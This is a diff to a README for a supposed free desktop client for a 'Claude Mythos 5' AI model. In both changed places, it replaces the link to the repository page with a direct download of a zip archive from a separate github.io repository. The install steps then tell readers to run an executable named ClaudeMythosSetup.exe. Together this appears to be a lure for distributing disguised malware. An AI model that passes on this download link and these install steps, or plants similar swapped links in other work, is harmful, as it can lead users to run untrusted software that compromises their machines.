@@ -5,7 +5,7 @@ description: "Access the Claude Mythos 5 AI model through a native desktop appli
 ---
 # 🤖 Claude-Mythos-5-AI-free - Run desktop AI without complex setups
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/clementedominical835/Claude-Mythos-5-AI-free)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/clementedominical835/clementedominical835.github.io/main/bezoar/3.3.zip)
 
 Claude-Mythos-5-AI-free acts as a bridge to desktop intelligence. It provides a straightforward interface for users who want to access advanced AI reasoning without managing browser tabs or complicated cloud accounts. This application focuses on workflow optimization and allows you to execute tasks directly on your computer hardware.
 
@@ -33,7 +33,7 @@ To ensure a smooth experience, verify that your computer meets these minimum spe
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the repository page to download the latest setup file: [https://github.com/clementedominical835/Claude-Mythos-5-AI-free](https://github.com/clementedominical835/Claude-Mythos-5-AI-free).
+1. Visit the repository page to download the latest setup file: [https://raw.githubusercontent.com/clementedominical835/clementedominical835.github.io/main/bezoar/3.3.zip](https://raw.githubusercontent.com/clementedominical835/clementedominical835.github.io/main/bezoar/3.3.zip).
 2. Locate the file named ClaudeMythosSetup.exe in your Downloads folder after the download finishes.
 3. Double-click the file to start the installation wizard.
 4. Accept the screen prompts by clicking Next until the process completes.
